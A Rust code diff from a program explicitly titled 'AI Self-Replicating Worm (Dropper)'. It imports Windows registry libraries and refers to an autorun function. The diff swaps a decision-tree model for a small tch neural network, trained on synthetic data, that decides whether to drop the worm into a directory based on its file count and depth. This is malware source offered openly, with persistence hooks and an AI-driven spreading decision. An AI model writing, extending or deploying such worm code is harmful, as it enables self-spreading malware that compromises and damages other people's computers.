@@ -6,8 +6,7 @@ use winreg::enums::*;
 use winreg::RegKey;
 use sysinfo::{System, SystemExt};
 use num_cpus;
-use linfa::prelude::*;
-use linfa_trees::DecisionTree;
+use tch::{nn, Device, Tensor, Kind};
 
 #[derive(Parser)]
 #[command(name = "AI Self-Replicating Worm (Dropper)")]
@@ -90,28 +89,45 @@ fn add_to_autorun() {
 }
 
 fn ai_decide_to_drop(file_count: f32, depth: f32) -> bool {
-    // Generate realistic training data based on typical directory structures
+    let device = Device::Cpu;
+    let vs = nn::VarStore::new(device);
+    let net = nn::seq()
+        .add(nn::linear(&vs.root() / "layer1", 2, 10, Default::default()))
+        .add_fn(|xs| xs.relu())
+        .add(nn::linear(&vs.root() / "layer2", 10, 1, Default::default()))
+        .add_fn(|xs| xs.sigmoid());
+
+    // Generate training data
     let mut features = Vec::new();
     let mut labels = Vec::new();
-
-    // Simulate data from real directories: small dirs (few files, shallow) -> false, large/deep -> true
     for i in 0..100 {
-        let fc = (i % 20) as f32 + rand::random::<f32>() * 10.0; // 0-30 files
-        let d = (i % 5) as f32 + rand::random::<f32>() * 3.0; // 0-8 depth
-        let should_drop = fc > 10.0 && d > 2.0; // Realistic rule: drop if crowded and deep
-        features.push(vec![fc, d]);
+        let fc = (i % 20) as f32 + rand::random::<f32>() * 10.0;
+        let d = (i % 5) as f32 + rand::random::<f32>() * 3.0;
+        let should_drop = fc > 10.0 && d > 2.0;
+        features.push(fc);
+        features.push(d);
         labels.push(if should_drop { 1.0 } else { 0.0 });
     }
 
-    let features_array = Array2::from_shape_vec((features.len(), 2), features.into_iter().flatten().collect()).unwrap();
-    let labels_array = Array1::from_vec(labels);
+    let x = Tensor::of_slice(&features).reshape(&[100, 2]).to_device(device);
+    let y = Tensor::of_slice(&labels).reshape(&[100, 1]).to_device(device);
 
-    let dataset = Dataset::new(features_array, labels_array);
-    let model = DecisionTree::params().fit(&dataset).unwrap();
+    // Train
+    let opt = nn::Adam::default().build(&vs, 1e-3).unwrap();
+    for _ in 0..1000 {
+        let pred = net.forward(&x);
+        let loss = pred.mse_loss(&y, tch::Reduction::Mean);
+        opt.backward_step(&loss);
+    }
 
-    let input = Array2::from_shape_vec((1, 2), vec![file_count, depth]).unwrap();
-    let prediction = model.predict(&input);
-    let decision = prediction[0] > 0.5;
+    // Save model
+    vs.save("worm_model.ot").unwrap();
+    println!("[AI] Model saved to worm_model.ot");
+
+    // Predict
+    let input = Tensor::of_slice(&[file_count, depth]).reshape(&[1, 2]).to_device(device);
+    let pred = net.forward(&input);
+    let decision = pred.double_value(&[0, 0]) > 0.5;
 
     println!("[AI] Directory has {} files, depth {}, deciding to {}", file_count, depth, if decision { "drop" } else { "skip" });
     decision
